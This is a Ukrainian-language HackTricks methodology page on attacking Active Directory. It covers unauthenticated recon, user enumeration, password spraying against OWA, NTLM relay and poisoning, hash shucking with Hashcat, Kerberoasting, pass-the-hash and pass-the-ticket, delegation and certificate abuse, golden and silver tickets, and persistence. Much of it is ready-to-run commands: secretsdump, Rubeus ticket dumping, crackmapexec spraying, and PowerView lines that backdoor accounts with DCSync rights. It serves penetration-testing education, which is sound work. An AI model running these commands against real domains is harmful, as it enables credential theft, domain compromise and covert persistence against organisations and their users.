# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Загальний огляд

**Active Directory** слугує базовою технологією, яка дозволяє **мережевим адміністраторам** ефективно створювати та керувати **доменами**, **користувачами** та **об'єктами** у мережі. Вона розроблена для масштабування, дозволяючи організовувати велику кількість користувачів у керовані **групи** та **підгрупи**, одночасно контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних шарів: **доменів**, **дерев** та **лісів**. **Домен** охоплює набори об'єктів, таких як **користувачі** або **пристрої**, що мають спільну базу даних. **Trees** — це групи доменів, пов'язані спільною структурою, а **forest** являє собою колекцію кількох дерев, взаємозв'язаних через **trust relationships**, утворюючи верхній рівень організаційної структури. На кожному з цих рівнів можна призначати конкретні **права доступу** та **права на комунікацію**.

Ключові поняття в **Active Directory** включають:

1. **Directory** – містить усю інформацію щодо об'єктів Active Directory.
2. **Object** – позначає сутності в довіднику, включаючи **користувачів**, **групи** або **спільні папки**.
3. **Domain** – служить контейнером для об'єктів довідника; у **forest** може існувати декілька доменів, кожен зі своєю колекцією об'єктів.
4. **Tree** – групування доменів, що мають спільний кореневий домен.
5. **Forest** – верхній рівень організаційної структури в Active Directory, складається з кількох дерев з **trust relationships** між ними.

**Active Directory Domain Services (AD DS)** охоплює набір сервісів, критичних для централізованого управління та комунікації в мережі. Ці сервіси включають:

1. **Domain Services** – централізує зберігання даних та керує взаємодіями між **користувачами** та **доменами**, включаючи **authentication** та **search** функціональності.
2. **Certificate Services** – керує створенням, розповсюдженням та адмініструванням безпечних **digital certificates**.
3. **Lightweight Directory Services** – підтримує додатки, які використовують довідник через протокол **LDAP**.
4. **Directory Federation Services** – надає можливості **single-sign-on** для аутентифікації користувачів у кількох веб-застосунках в одній сесії.
5. **Rights Management** – допомагає захищати авторські матеріали, регулюючи їх несанкціоноване розповсюдження та використання.
6. **DNS Service** – критично важливий для резолвінгу **domain names**.

Для детальнішого пояснення див.: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Щоб навчитися атакувати AD, потрібно дуже добре розуміти процес аутентифікації **Kerberos**.\
[**Прочитайте цю сторінку, якщо ви ще не знаєте, як це працює.**](kerberos-authentication.md)

## Шпаргалка

Можете відвідати [https://wadcoms.github.io/](https://wadcoms.github.io) щоб швидко переглянути, які команди можна виконувати для enumerate/exploit AD.

> [!WARNING]
> Комунікація **Kerberos** вимагає повного кваліфікованого імені (FQDN) для виконання дій. Якщо ви намагаєтесь підключитися до машини за IP-адресою, **використовуватиметься NTLM, а не Kerberos**.

## Recon Active Directory (без облікових даних/сесій)

Якщо ви маєте доступ до середовища AD, але не маєте жодних облікових даних/сесій, ви можете:

- **Pentest the network:**
- Сканувати мережу, знаходити машини та відкриті порти і намагатися **експлуатувати вразливості** або **витягти облікові дані** з них (наприклад, [принтери можуть бути дуже цікавими цілями](ad-information-in-printers.md)).
- Перерахування DNS може дати інформацію про ключові сервери в домені, такі як web, printers, shares, vpn, media тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Подивіться загальну [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) щоб знайти більше інформації про те, як це робити.
- **Check for null and Guest access on smb services** (це не спрацює на сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Більш детальний гайд щодо перерахування SMB-сервера можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Більш детальний гайд щодо перерахування LDAP можна знайти тут (зверніть **особливу увагу на anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Збирати облікові дані, **імітувавши сервіси з Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Отримати доступ до хоста, [**зловживаючи relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Збирати облікові дані, **показуючи фейкові UPnP сервіси з evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягувати імена користувачів/імена з внутрішніх документів, соціальних мереж, сервісів (переважно web) всередині доменних середовищ, а також з публічно доступних джерел.
- Якщо ви знайдете повні імена співробітників компанії, можна спробувати різні AD **username conventions** ([**прочитайте це**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Найпоширеніші конвенції: _NameSurname_, _Name.Surname_, _NamSur_ (3 літери кожного), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перерахування користувачів

- **Anonymous SMB/LDAP enum:** Див. сторінки [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) та [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Коли запитується **недійсний username**, сервер відповість з кодом помилки **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дозволяє визначити, що username недійсний. **Дійсні імена користувачів** викличуть або **TGT в AS-REP** відповіді, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, що вказує на вимогу виконати pre-authentication.
- **No Authentication against MS-NRPC**: Використання auth-level = 1 (No authentication) проти MS-NRPC (Netlogon) інтерфейсу на domain controllers. Метод викликає функцію `DsrGetDcNameEx2` після прив'язки до MS-NRPC інтерфейсу, щоб перевірити, чи існує користувач або комп'ютер без будь-яких облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип перерахування. Дослідження можна знайти [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви знайшли один із таких серверів у мережі, ви також можете виконати **user enumeration проти нього**. Наприклад, ви можете використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
> 
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Добре, отже ви вже знаєте дійсний username, але не маєте паролів... Спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо у користувача **немає** атрибута _DONT_REQ_PREAUTH_, ви можете **запросити AS_REP message** для цього користувача, який міститиме дані, зашифровані похідною від пароля користувача.
- [**Password Spraying**](password-spraying.md): Спробуйте найпоширеніші паролі для кожного виявленого користувача — можливо, хтось використовує слабкий пароль (пам'ятайте про password policy!).
- Зауважте, що ви також можете **spray OWA servers**, щоб спробувати отримати доступ до поштових скриньок користувачів.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Можливо, ви зможете **отримати** деякі challenge **hashes**, здійснивши **poisoning** певних протоколів у **мережі**:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося перелічити Active Directory, у вас буде **більше email-ів та краще розуміння мережі**. Можливо, ви зможете змусити NTLM здійснити [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack), щоб отримати доступ до AD середовища.

### Steal NTLM Creds

Якщо ви можете **доступитися до інших ПК або shares** під **null або guest user**, ви могли б **розмістити файли** (наприклад SCF file), які при доступі **спровокують NTLM authentication проти вас**, щоб ви могли **вкрасти** NTLM challenge для його cracking:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** трактує кожен NT hash, який у вас вже є, як кандидат-пароль для інших, повільніших форматів, ключовий матеріал яких напряму похідний від NT hash. Замість брутфорсу довгих passphrase у Kerberos RC4 tickets, NetNTLM challenges або cached credentials, ви подаєте NT hashes у Hashcat’s NT-candidate режими і дозволяєте йому перевірити повторне використання паролів, ніколи не дізнаючись plaintext. Це особливо потужно після компрометації домену, коли можна зібрати тисячі поточних і історичних NT hashes.

Використовуйте shucking коли:

- Ви маєте NT corpus з DCSync, SAM/SECURITY dumps або credential vaults і потрібно перевірити повторне використання в інших domains/forests.
- Ви захопили RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses або DCC/DCC2 blobs.
- Ви хочете швидко підтвердити повторне використання для довгих, незламних passphrase і негайно pivot через Pass-the-Hash.

Техніка **не працює** проти encryption types, ключі яких не базуються на NT hash (наприклад Kerberos etype 17/18 AES). Якщо домен примусово використовує тільки AES, потрібно повертатися до звичних режимів паролів.

#### Building an NT hash corpus

- **DCSync/NTDS** – Використайте `secretsdump.py` з history, щоб отримати максимально великий набір NT hashes (і їх попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Записи history суттєво розширюють пул кандидатів, оскільки Microsoft може зберігати до 24 попередніх хешів на акаунт. Для інших способів збору NTDS secrets див. :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує локальні SAM/SECURITY дані та cached domain logons (DCC/DCC2). Видаліть дублікати та додайте ці хеші до того ж списку `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, що породив кожен хеш (навіть якщо wordlist містить лише hex). Відповідні хеші одразу покажуть, який принципал повторно використовує пароль, щойно Hashcat виведе переможний кандидат.
- Віддавайте перевагу кандидатам з того ж forest або trusted forest; це максимізує шанси на збіг при shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Вимкніть rule engines (без `-r`, без hybrid режимів), бо маніпуляції псують candidate key material.
- Ці режими не обов’язково швидші, але keyspace NTLM (~30,000 MH/s на M3 Max) приблизно у ~100× швидший за Kerberos RC4 (~300 MH/s). Тестування кураторського NT списку значно дешевше, ніж дослідження всього паролного простору у повільному форматі.
- Завжди запустіть **останню збірку Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки режими 31500/31600/35300/35400 були додані недавно.
- Наразі немає NT режиму для AS-REQ Pre-Auth, а AES etypes (19600/19700) вимагають plaintext пароля, оскільки їхні ключі генеруються через PBKDF2 з UTF-16LE паролів, а не з raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Захопіть RC4 TGS для цільового SPN з low-privileged user (див. сторінку Kerberoast для деталей):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket з вашим NT списком:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derivе ключ RC4 з кожного NT candidate і перевіряє `$krb5tgs$23$...` blob. Збіг підтверджує, що service account використовує один із ваших наявних NT hashes.

3. Негайно pivot через PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Опційно ви можете відновити plaintext пізніше з `hashcat -m 1000 <matched_hash> wordlists/`, якщо потрібно.

#### Example – Cached credentials (mode 31600)

1. Здампте cached logons з скомпрометованої робочої станції:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Скопіюйте DCC2 рядок для цікавого domain user в `dcc2_highpriv.txt` і shuck-ніть його:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Успішний збіг дає NT hash, який вже відомий у вашому списку, підтверджуючи, що cached user повторно використовує пароль. Використайте його напряму для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або розкрутіть офлайн у швидкому NTLM режимі, щоб відновити рядок.

Точно такий самий робочий процес застосовується до NetNTLM challenge-responses (`-m 27000/27100`) і DCC (`-m 31500`). Після ідентифікації збігу ви можете ініціювати relay, SMB/WMI/WinRM PtH або повторно crack-нути NT hash з допомогою masks/rules офлайн.

## Enumerating Active Directory WITH credentials/session

Для цього етапу вам потрібно **компрометувати credentials або session валідного domain account.** Якщо у вас є деякі валідні credentials або shell як domain user, **пам’ятайте, що опції, наведені раніше, залишаються доступними для компрометації інших користувачів.**

Перш ніж почати authenticated enumeration, ви повинні знати, що таке **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Компрометація акаунта — це **великий крок до компрометації всього домену**, адже ви зможете почати **Active Directory Enumeration:**

Щодо [**ASREPRoast**](asreproast.md) — тепер ви можете знайти всіх потенційно вразливих користувачів, а щодо [**Password Spraying**](password-spraying.md) — ви можете отримати **список усіх username-ів** і спробувати пароль компрометованого акаунта, порожні паролі та інші перспективні паролі.

- Ви можете використати [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використовувати [**powershell for recon**](../basic-powershell-for-pentesters/index.html), що буде stealthier
- Ви також можете [**use powerview**](../basic-powershell-for-pentesters/powerview.md) для вилучення детальної інформації
- Інший чудовий інструмент для recon в Active Directory — [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежно від методів збору), але **якщо вас це не хвилює**, обов’язково спробуйте. Знайдіть, де користувачі можуть RDP, шляхи до інших груп тощо.
- **Інші автоматизовані AD enumeration інструменти:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) можуть містити цікаву інформацію.
- Інструмент з GUI для перелічення директорії — **AdExplorer.exe** з **SysInternal** Suite.
- Ви також можете шукати в LDAP базі через **ldapsearch**, щоб знайти credentials у полях _userPassword_ & _unixUserPassword_, або навіть у _Description_. див. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) для інших методів.
- Якщо ви використовуєте **Linux**, можна також перерахувати домен за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Можна також спробувати автоматизовані інструменти:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Дуже просто отримати всі domain usernames з Windows (`net user /domain` ,`Get-DomainUser` або `wmic useraccount get name,sid`). В Linux можна використати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо секція Enumeration виглядає короткою, це найважливіша частина. Перейдіть за посиланнями (особливо ті, що по cmd, powershell, powerview і BloodHound), навчіться перераховувати домен і практикуйтесь, поки не почуватиметесь упевнено. Під час оцінювання саме цей момент буде ключовим, щоб знайти шлях до DA або вирішити, що нічого зробити не вдасться.

### Kerberoast

Kerberoasting включає отримання **TGS tickets**, які використовуються сервісами, прив'язаними до user accounts, і offline cracking їхнього шифрування — яке базується на паролях користувачів.

Детальніше:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Після отримання деяких credentials ви могли б перевірити, чи маєте доступ до якихось **машин**. Для цього можна використати **CrackMapExec**, щоб спробувати підключення до кількох серверів через різні протоколи згідно з вашим port scan.

### Local Privilege Escalation

Якщо ви скомпрометували credentials або сесію як звичайний domain user і маєте **доступ** з цим користувачем до **будь-якої машини в домені**, слід спробувати шлях до **локального escalation** та пошуку credentials. Лише маючи local administrator права ви зможете **дампити хеші інших користувачів** з пам'яті (LSASS) та локально (SAM).

У цій книзі є повна сторінка про [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) та [**checklist**](../checklist-windows-privilege-escalation.md). Також не забувайте використовувати [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Дуже **малоймовірно**, що ви знайдете **tickets** у поточного користувача, які б давали вам дозвіл на доступ до несподіваних ресурсів, але ви можете перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося просканувати Active Directory, у вас буде **більше email-адрес і краще розуміння мережі**. Можливо, ви зможете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Шукайте Creds у Computer Shares | SMB Shares

Тепер, коли у вас є базові облікові дані, слід перевірити, чи можете ви **знайти** будь-які **цікаві файли, які розшарені в межах AD**. Ви можете робити це вручну, але це дуже нудне повторюване завдання (особливо якщо ви знайдете сотні документів, які потрібно перевірити).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або спільних ресурсів**, ви можете **розмістити файли** (наприклад SCF file), які, у разі відкриття, спричинять **NTLM authentication до вас** — таким чином ви зможете **вкрасти** **NTLM challenge** для його злому:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачу **компрометувати контролер домену**.


{{#ref}}
printnightmare.md
{{#endref}}

## Ескалація привілеїв в Active Directory WITH privileged credentials/session

**Для наступних технік простого доменного користувача недостатньо — потрібні спеціальні привілеї/облікові дані, щоб виконати ці атаки.**

### Hash extraction

Сподіваємось, вам вдалося **компрометувати локальний admin** акаунт, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) включно з relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Потім настав час отримати всі хеші з пам'яті та локальної системи.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Потрібно використати якийсь **tool**, який **виконає** **NTLM authentication з використанням** цього **hash**, **або** ви можете створити новий **sessionlogon** і **inject** цей **hash** в **LSASS**, так що при будь-якій **NTLM authentication** цей **hash** буде використаний. Останній варіант — це те, що робить mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака має на меті **використати NTLM hash користувача для запиту Kerberos tickets**, як альтернативу звичному Pass The Hash через NTLM. Тому це може бути особливо **корисним в мережах, де NTLM protocol вимкнено**, і дозволено лише **Kerberos** як протокол автентифікації.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** нападники **викрадають authentication ticket користувача** замість пароля чи хешів. Цей вкрадений ticket потім використовується для **імітації користувача**, що дає несанкціонований доступ до ресурсів і сервісів у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Якщо у вас є **hash** або **password** **локального administrator'а**, спробуйте **увійти локально** на інші **PCs** з його допомогою.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **шумно**, і **LAPS** міг би це **пом’якшити**.

### MSSQL Abuse & Trusted Links

Якщо користувач має привілеї для **доступу до MSSQL instances**, він може використати це, щоб **виконувати команди** на хості MSSQL (якщо процес працює під SA), **вкрасти** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Також, якщо екземпляр MSSQL є trusted (database link) для іншого MSSQL екземпляра. Якщо користувач має привілеї над trusted database, він зможе **використати довірчі відносини для виконання запитів також в іншому екземплярі**. Ці довіри можна ланцюжити, і в якийсь момент користувач може знайти неправильно налаштовану базу даних, де зможе виконувати команди.\
**Посилання між базами даних працюють навіть через forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Сторонні системи інвентаризації та деплойменту часто відкривають потужні шляхи до credentials і виконання коду. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і у вас є domain привілеї на цьому комп’ютері, ви зможете дампити TGTs з пам’яті всіх користувачів, які входять на цей комп’ютер.\
Отже, якщо **Domain Admin заходить на цей комп’ютер**, ви зможете дампити його TGT і імперсонувати його, використовуючи [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть могли б **автоматично скомпрометувати Print Server** (сподіваюсь, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувач або комп’ютер дозволені для "Constrained Delegation", це дає можливість **імітувати будь-якого користувача для доступу до певних сервісів на комп’ютері**.\
Тоді, якщо ви **скомпрометуєте hash** цього користувача/комп’ютера, ви зможете **імітувати будь-якого користувача** (навіть domain admins) для доступу до певних сервісів.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Маючи **WRITE** привілей на об’єкті Active Directory віддаленого комп’ютера дає можливість досягти виконання коду з **підвищеними правами**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Скомпрометований користувач може мати деякі **цікаві привілеї над деякими domain objects**, які можуть дозволити вам **переміщатись латерально/підвищувати привілеї**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Виявлення **Spool service listening** в межах домену може бути **зловживане** для **отримання нових credentials** та **ескалювання привілеїв**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Якщо **інші користувачі** **доступаються** до **скомпрометованої** машини, можливо **збирати credentials з пам’яті** і навіть **інжектити beacons у їхні процеси**, щоб імітувати їх.\
Зазвичай користувачі підключаються до системи через RDP, тому тут показано, як виконати декілька атак над чужими RDP сесіями:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** забезпечує систему для управління **локальним паролем Administrator** на доменно приєднаних комп’ютерах, гарантуючи, що він **рандомізований**, унікальний і часто **змінюється**. Ці паролі зберігаються в Active Directory, а доступ контролюється через ACL для авторизованих користувачів. Маючи достатні дозволи для доступу до цих паролів, можливе pivoting на інші комп’ютери.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Збір certificates** зі скомпрометованої машини може бути способом ескалації привілеїв у межах середовища:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Якщо налаштовані **уразливі templates**, їх можна використати для ескалації привілеїв:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Як тільки ви отримаєте **Domain Admin** або ще краще **Enterprise Admin** привілеї, ви можете **дампити** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з технік, обговорених вище, можуть бути використані для persistence.\
Наприклад, ви можете:

- Зробити користувачів вразливими до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити користувачів вразливими до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати привілеї [**DCSync**](#dcsync) користувачу

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Атака **Silver Ticket** створює **легітимний Ticket Granting Service (TGS) ticket** для конкретного сервісу, використовуючи **NTLM hash** (наприклад, **hash PC account**). Цей метод застосовується для **доступу до привілеїв сервісу**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Атака **Golden Ticket** означає, що нападник отримав доступ до **NTLM hash облікового запису krbtgt** в Active Directory. Цей акаунт особливий, бо він використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, які необхідні для аутентифікації в AD мережі.

Отримавши цей hash, атакувальник може створювати **TGTs** для будь-якого облікового запису на свій розсуд (атаку Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це схоже на golden tickets, але сформовані так, щоб **оминути поширені механізми виявлення golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Маючи certificates облікового запису або можливість їх запитувати** — це дуже хороший спосіб зберегти persistence в обліковому записі користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використання certificates також дозволяє зберігати persistence з високими привілеями в межах домену:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Об’єкт **AdminSDHolder** в Active Directory забезпечує захист **привілейованих груп** (наприклад, Domain Admins та Enterprise Admins), застосовуючи стандартний **ACL** до цих груп, щоб запобігти неавторизованим змінам. Однак ця функція може бути експлуатована; якщо атакуючий змінить ACL AdminSDHolder, надавши повний доступ звичайному користувачу, цей користувач отримає широкі повноваження над усіма привілейованими групами. Цей механізм безпеки, що має захищати, може працювати проти, дозволяючи небажаний доступ без належного моніторингу.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

У кожному **Domain Controller (DC)** існує **локальний адміністратор**. Отримавши admin-права на таку машину, хеш локального Administrator можна витягти за допомогою **mimikatz**. Після цього необхідно внести зміни в реєстр, щоб **дозволити використання цього пароля**, що дозволяє віддалений доступ до облікового запису локального Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **наділити** користувача деякими **спеціальними правами** над певними domain objects, що дозволить цьому користувачу **ескалювати привілеї в майбутньому**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

